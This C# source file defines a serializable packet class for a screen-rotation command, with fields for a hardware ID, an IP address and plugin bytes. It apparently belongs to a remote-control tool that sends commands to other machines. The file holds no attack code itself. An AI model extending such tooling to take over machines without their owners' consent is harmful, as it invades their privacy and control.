using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ScreenRotationPacket : IPacket
    {
        public ScreenRotationPacket(string degrees) : base()
        {
            this.packetType = PacketType.MISC_SCREEN_ROTATION;

            this.degrees = degrees; 
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string degrees { get; set; }
    }
}
